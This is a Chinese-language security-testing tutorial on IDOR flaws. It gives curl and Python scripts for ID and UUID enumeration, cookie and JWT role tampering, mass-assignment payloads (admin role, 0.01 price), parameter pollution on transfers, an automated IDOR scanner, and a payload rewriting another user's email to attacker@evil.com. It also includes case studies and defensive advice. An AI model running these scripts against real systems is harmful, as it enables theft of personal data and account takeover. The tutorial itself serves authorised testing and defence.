# 越权漏洞检测（IDOR）

> **合规声明**: 本文档仅供授权安全测试使用。未经授权对目标系统进行测试可能违反法律法规。请在获得明确书面授权后进行任何安全测试活动。

---

## 目录

1. [漏洞概述](#1-漏洞概述)
2. [水平越权](#2-水平越权)
3. [垂直越权](#3-垂直越权)
4. [检测方法论](#4-检测方法论)
5. [自动化检测思路](#5-自动化检测思路)
6. [真实案例](#6-真实案例)

---

## 1. 漏洞概述

### 什么是 IDOR？

Insecure Direct Object Reference（不安全直接对象引用）是指应用程序在访问资源时直接使用用户输入的标识符（如 ID、UUID、文件名）而没有进行适当的权限检查。攻击者可以通过修改这些标识符来访问未授权的数据。

### 分类

| 类型 | 描述 | 示例 |
|------|------|------|
| **水平越权** | 同级别用户之间的越权 | A 用户查看 B 用户的订单 |
| **垂直越权** | 低权限用户访问高权限功能 | 普通用户执行管理操作 |
| **IDOR 静态文件** | 通过枚举 ID 访问静态资源 | 下载其他用户的发票 PDF |

---

## 2. 水平越权

### 2.1 修改用户 ID

最常见的 IDOR 场景：URL 或 API 请求中包含可直接替换的用户标识符。

```bash
# 原始请求：获取当前用户资料
curl -X GET "https://target.com/api/user/profile" \
  -H "Authorization: Bearer USER_TOKEN"

# 响应：
{"id": 1001, "name": "User A", "email": "usera@example.com", "balance": 1500.00}

# IDOR 测试：尝试获取其他用户资料
curl -X GET "https://target.com/api/user/profile?id=1002" \
  -H "Authorization: Bearer USER_TOKEN"

curl -X GET "https://target.com/api/user/profile/1002" \
  -H "Authorization: Bearer USER_TOKEN"

curl -X GET "https://target.com/api/user/1002/profile" \
  -H "Authorization: Bearer USER_TOKEN"
```

### 2.2 修改邮箱/手机号

```bash
# 目标：修改其他用户的邮箱
curl -X PUT "https://target.com/api/user/update" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"id": 1002, "email": "attacker@evil.com"}'
```

### 2.3 越权操作 API 测试

```python
import requests

session = requests.Session()
session.headers.update({
    "Authorization": "Bearer VALID_TOKEN",
    "Content-Type": "application/json",
})

base_url = "https://target.com/api"
endpoints = [
    f"{base_url}/user/1002",
    f"{base_url}/user/1002/profile",
    f"{base_url}/user/profile?user_id=1002",
    f"{base_url}/user/profile/1002",
    f"{base_url}/v2/user/1002",
    f"{base_url}/users/1002",
    f"{base_url}/account/1002",
    f"{base_url}/customer/1002",
]

for endpoint in endpoints:
    r = session.get(endpoint)
    print(f"[{r.status_code}] {endpoint}")
    if r.status_code == 200 and r.text:
        print(f"  Data: {r.text[:100]}...")
```

---

## 3. 垂直越权

### 3.1 通过 Cookie/Token 篡改

```bash
# 普通用户 Token → 尝试提权
curl -X GET "https://target.com/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9..."

# 尝试篡改 Token 中的 role 字段
# Base64 解码 JWT payload，修改 role 为 admin 后再编码回原处
```

### 3.2 未授权管理接口

```bash
# 常见管理路径
for path in /admin /manage /console /dashboard /api/admin /admin.php /backend; do
    curl -s -o /dev/null -w "%{http_code}" "https://target.com$path"
    echo " $path"
done
```

### 3.3 测试垂直越权

```python
import requests

# 假设有普通用户 Token
session = requests.Session()
session.headers.update({
    "Authorization": "Bearer LOW_PRIV_TOKEN",
    "Content-Type": "application/json",
})

admin_endpoints = [
    "/admin/users",
    "/admin/users/create",
    "/admin/config",
    "/api/admin/users",
    "/api/v2/admin/",
    "/manage/users",
    "/manage/roles",
    "/console",
    "/internal/users",
]

base = "https://target.com"

for path in admin_endpoints:
    r = session.get(base + path)
    if r.status_code != 403 and r.status_code != 401:
        print(f"[!] Potential vertical IDOR: {path} -> {r.status_code}")
        if r.status_code == 200:
            print(f"    Content preview: {r.text[:200]}")
```

### 3.4 隐藏参数/字段提权

```json
// 注册时添加额外字段尝试提权
POST /api/user/register
{
  "username": "attacker",
  "password": "Pass123!",
  "email": "attacker@test.com",
  "role": "admin",
  "is_admin": true,
  "user_type": "admin",
  "permissions": ["read", "write", "admin"],
  "group": "administrators"
}
```

---

## 4. 检测方法论

### 4.1 参数遍历

#### 数字 ID 递增

```bash
# 顺序递增探测
for id in $(seq 1001 1100); do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/order/$id" \
    -H "Authorization: Bearer TOKEN")
  if [ "$response" = "200" ]; then
    echo "Order $id is accessible"
  fi
done
```

#### UUID 枚举

```python
import requests
import uuid

base = "https://target.com/api/document/"
token = "YOUR_TOKEN"
headers = {"Authorization": f"Bearer {token}"}

# 批量尝试
known_uuids = [
    "550e8400-e29b-41d4-a716-446655440000",
    "6ba7b810-9dad-11d1-80b4-00c04fd430c8",
    # ... 从公开泄露、或从已获取文档中提取
]
for uid in known_uuids:
    r = requests.get(f"{base}{uid}", headers=headers)
    if r.status_code == 200:
        print(f"[+] Document accessible: {uid}")
        print(f"    Content: {r.text[:200]}")
```

#### Python 自动化批量测试

```python
import requests
import concurrent.futures

def test_idor(url, token):
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(url, headers=headers, timeout=5)
        return url, r.status_code, len(r.text)
    except:
        return url, "Error", 0

base = "https://target.com/api/order"
token = "USER_TOKEN"
urls = [f"{base}/{i}" for i in range(1001, 2001)]

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    results = executor.map(lambda url: test_idor(url, token), urls)
    for url, status, length in results:
        if status == 200:
            print(f"[+] {url} -> Status: {status}, Size: {length}")
```

### 4.2 Cookie/Token 解码后篡改

```python
import base64
import json
import requests

# 解码常见 Base64 编码的 Cookie/Token
def decode_and_modify(cookie_value):
    """解码 Base64 cookie，修改 role 字段后重新编码"""
    try:
        decoded = base64.b64decode(cookie_value + "==").decode("utf-8")
        data = json.loads(decoded)
        print(f"[*] Decoded: {data}")

        # 尝试各种 role 字段名
        role_fields = ["role", "user_type", "type", "group", "permissions",
                       "is_admin", "access_level", "privilege"]
        for field in role_fields:
            if field in data:
                data[field] = "admin"
                modified = base64.b64encode(json.dumps(data).encode()).decode()
                print(f"[*] Modified {field}: {modified}")

                # 发送修改后的 Cookie
                r = requests.get("https://target.com/admin",
                               cookies={"session": modified})
                if r.status_code == 200:
                    print(f"[+] Bypass with modified {field}!")
                return modified
    except:
        return None

# 使用
cookie = "eyJ1c2VySWQiOiAxLCAicm9sZSI6ICJ1c2VyIn0="
decode_and_modify(cookie)
```

### 4.3 JSON 字段添加（Mass Assignment）

```python
import requests

session = requests.Session()
session.headers.update({
    "Authorization": "Bearer USER_TOKEN",
    "Content-Type": "application/json",
})

base = "https://target.com/api"

# 场景1：创建资源时添加额外隐藏字段
mass_assignment_payloads = [
    {"title": "new doc", "content": "test", "is_public": True},           # 公开字段
    {"title": "new doc", "content": "test", "readers": ["*"]},            # 全局可读
    {"title": "new doc", "content": "test", "author": "another_user"},    # 伪造作者
    {"title": "new doc", "content": "test", "owner_id": 9999},           # 伪造所有者
    {"title": "new doc", "content": "test", "price": "0.01"},            # 修改价格
]

for payload in mass_assignment_payloads:
    r = session.post(f"{base}/documents", json=payload)
    print(f"[{r.status_code}] {payload}")

# 场景2：更新资源时添加额外字段
update_payloads = [
    {"price": 0, "id": 1002},
    {"price": 1, "id": 1002},
    {"price": 0.01, "currency": "USD", "id": 1002},
]

for payload in update_payloads:
    r = session.put(f"{base}/order/1002", json=payload)
    if r.status_code == 200:
        print(f"[+] Price modified! {payload}")
```

### 4.4 参数位置切换

```python
import requests

api = "https://target.com/api/user/profile"
token = "USER_TOKEN"
target_id = "1002"

# 同一参数在不同位置测试
tests = [
    # GET 参数
    ("GET", f"{api}?user_id={target_id}", {"Authorization": f"Bearer {token}"}, None),
    ("GET", f"{api}/{target_id}", {"Authorization": f"Bearer {token}"}, None),

    # POST body（JSON）
    ("POST", api, {"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
     {"user_id": target_id}),

    # POST body（form）
    ("POST", api, {"Authorization": f"Bearer {token}"},
     {"user_id": target_id}),

    # 放在 Header
    ("GET", api, {"Authorization": f"Bearer {token}", "X-User-ID": target_id}, None),

    # 放在 Cookie
    ("GET", api, {"Authorization": f"Bearer {token}"}, None, {"user_id": target_id}),
]

for method, url, headers, data in tests:
    try:
        if method == "GET":
            r = requests.get(url, headers=headers)
        else:
            r = requests.post(url, headers=headers, json=data)
        if r.status_code == 200:
            print(f"[+] {method} {url} -> {r.status_code}")
    except Exception as e:
        print(f"[!] {method} {url} -> {e}")
```

### 4.5 HPP（HTTP Parameter Pollution）

```python
import requests

url = "https://target.com/api/transfer"
token = "USER_TOKEN"
headers = {"Authorization": f"Bearer {token}"}

# HPP 测试：利用 WAF/后端解析差异
payloads = [
    # 参数重复，WAF 取第一个，后端取最后一个
    [("from", "1001"), ("to", "1002"), ("amount", "100")],       # 正常
    [("from", "1001"), ("to", "1002"), ("to", "9999"), ("amount", "100")],  # 越权
    [("from", ""), ("to", "1002"), ("amount", "100")],           # 空值
    [("from", "null"), ("to", "1002"), ("amount", "100")],       # null
    [("from", "1001"), ("to", "1002"), ("amount", "0.01")],      # 小额
    [("from", "1001"), ("to", "1002"), ("amount", "-100")],      # 负数
    [("from", "1001"), ("to", "1002"), ("amount", "1e10")],      # 科学计数法
]

for params in payloads:
    r = requests.post(url, headers=headers, data=params)
    if r.status_code == 200:
        print(f"[+] HPP bypass: {params} -> {r.status_code}")
        print(f"    {r.text[:200]}")
```

### 4.6 空值/特殊值绕过

```python
import requests

url = "https://target.com/api/user/profile"
headers = {"Authorization": "Bearer USER_TOKEN"}

# 空值/特殊值绕过
bypass_values = [
    # 空值
    {"user_id": None},
    {"user_id": ""},
    {"user_id": "null"},
    {"user_id": "undefined"},
    {"user_id": "NaN"},

    # 通配符
    {"user_id": "*"},
    {"user_id": "%"},
    {"user_id": "."},
    {"user_id": "0"},

    # 数组形式
    {"user_id": [1001, 1002]},
    {"user_id[]": 1002},

    # 特殊字符
    {"user_id": "..;/"},
    {"user_id": "./"},
    {"user_id": "../"},
    {"user_id": "..\\"},
]

for params in bypass_values:
    r = requests.get(url, params=params, headers=headers)
    if r.status_code == 200 and r.text != "{}":
        user_data = r.json()
        if "id" in user_data and user_data["id"] != 1001:
            print(f"[+] Bypass with {params}!")
            print(f"    Accessed user: {user_data}")
```

---

## 5. 自动化检测思路

### 5.1 Burp Suite + Autorize/Authorize

- 安装 Autorize 或 Authorize 插件
- 配置低权限 Cookie/Token
- 以高权限用户身份浏览整个应用
- 插件自动重放请求并标记越权漏洞

### 5.2 自定义 Python 扫描器框架

```python
#!/usr/bin/env python3
"""
简易 IDOR 自动扫描器
"""

import requests
import json
import concurrent.futures
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Optional

class IDORScanner:
    def __init__(self, base_url: str, token: str):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update({
            "Authorization": f"Bearer {token}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
            "Accept": "application/json",
        })

    def extract_ids_from_response(self, response_text: str) -> List[str]:
        """从响应中提取可能的 ID"""
        ids = set()
        try:
            data = json.loads(response_text)
            # 递归提取所有数值字段
            def extract(obj, path=""):
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        if k.lower() in ("id", "user_id", "order_id", "uid",
                                         "account_id", "customer_id"):
                            if isinstance(v, (int, str)):
                                ids.add(str(v))
                        extract(v, f"{path}.{k}")
                elif isinstance(obj, list):
                    for item in obj:
                        extract(item, path)
            extract(data)
        except:
            pass
        return list(ids)

    def scan_endpoint(self, endpoint: str, id_field: str = "id"):
        """扫描单个端点的 IDOR"""
        url = f"{self.base_url}/{endpoint.lstrip('/')}"
        results = []

        # 获取有效 ID
        try:
            r = self.session.get(url)
            if r.status_code != 200:
                return []
            ids = self.extract_ids_from_response(r.text)
        except:
            return []

        # 对每个 ID 做替换测试
        for target_id in ids[:10]:  # 限制测试数量
            test_urls = [
                f"{url}/{target_id}",
                f"{url}?{id_field}={target_id}",
                f"{url}?{id_field}={int(target_id) + 1}",
                f"{url}?id={int(target_id) + 1}",
            ]
            for test_url in test_urls:
                try:
                    r = self.session.get(test_url)
                    if r.status_code == 200 and len(r.text) > 10:
                        results.append({
                            "url": test_url,
                            "status": r.status_code,
                            "size": len(r.text),
                        })
                except:
                    pass

        return results

    def run(self, endpoints: List[str]):
        """运行扫描"""
        print("[*] Starting IDOR scan...")
        for ep in endpoints:
            print(f"[*] Scanning: {ep}")
            results = self.scan_endpoint(ep)
            for res in results:
                print(f"  [!] Potential IDOR: {res['url']} ({res['status']}, {res['size']}B)")


# 使用示例
if __name__ == "__main__":
    scanner = IDORScanner(
        base_url="https://target.com/api",
        token="USER_JWT_TOKEN_HERE"
    )
    scanner.run(["users", "orders", "documents", "invoices"])
```

### 5.3 识别 IDOR 的 SOP

1. **建立基线** — 用高权限用户和低权限用户分别记录正常请求
2. **识别参数** — 找出所有带有数字 ID、UUID、邮箱、用户名参数的请求
3. **替换测试** — 将参数替换为其他已知值（注册两个账号互测）
4. **方法切换** — 如果 GET 受限，测试 POST、PUT、DELETE
5. **路径遍历** — 尝试 `/../`、`/./` 等路径操作
6. **参数扩增** — 添加隐藏参数（`user_id`、`admin`、`role`）
7. **验证** — 确认是否可以查看/修改/删除不属于自己的资源

---

## 6. 真实案例

### 案例 1：外卖平台订单越权

- **场景**: 订单详情 API `/api/order/{order_id}`
- **参数**: 自增数字 ID（从 100000 开始）
- **绕过**: 直接递增 order_id 遍历所有订单，获取用户姓名、电话、地址
- **修复**: 改用 UUID，增加权限校验中间件

### 案例 2：社交平台私信越权

- **场景**: 私信 API `/api/messages?conversation_id={id}`
- **参数**: 自增 conversation_id
- **绕过**: $id+1 访问其他用户的私信内容
- **修复**: 验证当前用户是否为 conversation 的参与者

### 案例 3：云存储文件越权

- **场景**: 文件下载 `/api/file/download?file_id={UUID}`
- **参数**: 随机 UUID（理论上不可枚举）
- **绕过**: 发现文件分享功能中的 `is_public` 字段，添加 `"is_public": true` 到上传请求后，其他人的文件可被遍历
- **修复**: 文件分享必须显式设置权限，不默认公开

### 案例 4：医疗平台患者数据越权

- **场景**: 电子病历 API `/api/patient/records`
- **绕过**: 在请求中添加 `X-Forwarded-For: 10.0.0.1` 后，后端信任内网 IP 跳过 Token 验证
- **影响**: 可获取所有患者的病历
- **修复**: 移除 IP 信任机制，统一验签

### 案例 5：电商平台 Mas Assignment

- **场景**: 购买 API，使用 JSON 格式
- **Payload**:
```json
{
  "product_id": 123,
  "quantity": 1,
  "coupon": "WELCOME10",
  "price": 0.01,
  "is_admin_purchase": true
}
```
- **结果**: 成功以 0.01 元购买商品
- **修复**: 使用 DTO（数据传输对象），不直接绑定请求体到实体模型

---

## 防御建议（供参考）

1. **始终进行权限验证** — 每个 API 端点必须检查当前用户对目标资源的访问权限
2. **避免直接暴露内部 ID** — 使用 UUID 而非自增 ID，但注意 UUID 不等于安全
3. **使用间接引用** — 如 `/api/user/me/profile` 而非 `/api/user/1001/profile`
4. **实施统一鉴权中间件** — 对所有 API 端点强制执行鉴权逻辑
5. **参数绑定限制** — 使用 DTO 模式，避免 Mass Assignment
6. **审计日志** — 记录所有数据访问行为，便于事后追溯

> **提醒**: 所有 IDOR 测试需要在授权范围内进行。发现 IDOR 后不要批量抓取数据，及时报告漏洞即可。
